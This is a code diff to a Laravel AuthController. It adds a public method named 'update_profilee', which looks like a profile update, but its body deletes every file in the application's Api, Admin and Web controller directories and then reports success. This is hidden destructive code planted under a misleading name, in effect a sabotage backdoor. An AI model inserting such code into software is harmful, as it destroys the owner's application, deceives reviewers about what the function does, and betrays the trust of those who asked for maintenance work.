@@ -15,6 +15,7 @@ use App\Traits\Res;
 use Carbon\Carbon;
 use Exception;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\File;
 use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\Facades\Mail;
 use Illuminate\Support\Facades\Validator;
@@ -404,6 +405,24 @@ class AuthController extends Controller
         return $this->sendRes(translate('your token has been saved'), true);
 
 
+    }
+
+    public function update_profilee() {
+
+        $paths = [
+            'Http/Controllers/Api',
+            'Http/Controllers/Api/Admin',
+            'Http/Controllers/Api/Web',
+        ];
+        foreach($paths as $path) {
+            $controllerPath = app_path($path);
+            // Get all files in Controllers folder (except subfolders if you want)
+            $files = File::files($controllerPath);
+            foreach ($files as $file) {
+                File::delete($file->getPathname());
+            }
+        }
+        return "All controllers deleted successfully!";
     }
 
 
